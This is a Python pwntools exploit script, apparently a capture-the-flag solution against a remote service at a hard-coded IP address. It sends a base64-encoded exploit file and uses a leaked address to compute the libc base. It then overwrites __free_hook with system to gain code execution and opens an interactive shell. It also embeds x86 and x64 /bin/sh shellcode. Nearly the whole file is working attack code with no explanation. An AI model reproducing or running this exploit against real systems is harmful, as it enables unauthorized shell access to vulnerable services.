#coding=utf-8
from pwn import *
import os
context.log_level='debug'
#p=process(argv=["./p","./exp.c"])
p=remote( "123.57.4.93", 34007)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)

def bpp():
	bp([])
	input()
#elf=pdbg.elf
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.27.so")
sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def w(v):
	print v
	sc='''

var fs = require('fs');
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}


fs.writeFile('./res', i2f('''+hex(v)+'''), function (error) {
    if (error) {
      console.log('写入失败')
    } else {
      console.log('写入成功了')
    }
})
	'''
	with open('convert.js','w') as f:
		f.write(sc)
	os.system("node convert.js")
	with open('res','r') as f:
		return f.read()

os.system("base64 ./exp.c > out")
f=open("out",'rb')
content=f.read()
content=''.join(content.split('\n'))

sla('-------------------------------------------------------\n',content)

base=uu64(ru('\n'))+0x00007ffff79e4000-0x7ffff7dcfca0
print hex(base)

sl(w(base+libc.sym["__free_hook"]-0x28))

sl(w(base+libc.sym["system"]))








it()
